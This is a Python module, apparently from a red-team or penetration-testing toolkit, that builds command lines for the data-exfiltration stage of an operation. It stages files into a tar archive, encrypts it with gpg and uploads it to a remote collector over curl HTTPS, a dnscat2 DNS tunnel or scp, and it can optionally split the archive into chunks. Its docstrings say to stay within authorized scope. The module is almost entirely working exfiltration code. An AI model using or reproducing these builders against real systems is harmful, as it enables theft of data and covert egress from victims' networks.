"""Exfiltration planning (staging + egress command builders).

Builds the commands an operator uses to stage, compress, encrypt and move loot
(TA0010). Nothing runs here; egress must be within the authorized scope.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional

_CHUNKED = "split -b 8M loot.tar.gz loot.part."


def stage_command(paths: List[str], out: str = "loot.tar.gz") -> List[str]:
    return ["tar", "czf", out, *paths]


def encrypt_command(archive: str = "loot.tar.gz", out: str = "loot.tar.gz.gpg",
                    passphrase: Optional[str] = None) -> List[str]:
    # symmetric gpg; if a passphrase is given, feed it non-interactively.
    if passphrase:
        return ["gpg", "--batch", "--yes", "--passphrase", passphrase,
                "-c", "-o", out, archive]
    return ["gpg", "-c", "-o", out, archive]


def upload_command(archive: str, dest: str, method: str = "https") -> List[str]:
    """dest: an operator-controlled collector URL (authorized)."""
    if method == "https":
        return ["curl", "-sS", "--upload-file", archive, dest]
    if method == "dns":
        return ["dnscat2", "--domain", dest, "--upload", archive]
    return ["scp", archive, dest]


def exfil_plan(paths: List[str], dest: str, *, method: str = "https",
               passphrase: Optional[str] = None, chunk: bool = False) -> Dict[str, Any]:
    archive = "loot.tar.gz"
    plan: Dict[str, Any] = {
        "stage": stage_command(paths, archive),
        "encrypt": encrypt_command(archive, archive + ".gpg", passphrase),
        "upload": upload_command(archive + ".gpg", dest, method),
        "warning": "exfiltrate only data within the authorized scope; log every transfer",
    }
    if chunk:
        plan["chunk"] = _CHUNKED
    return plan
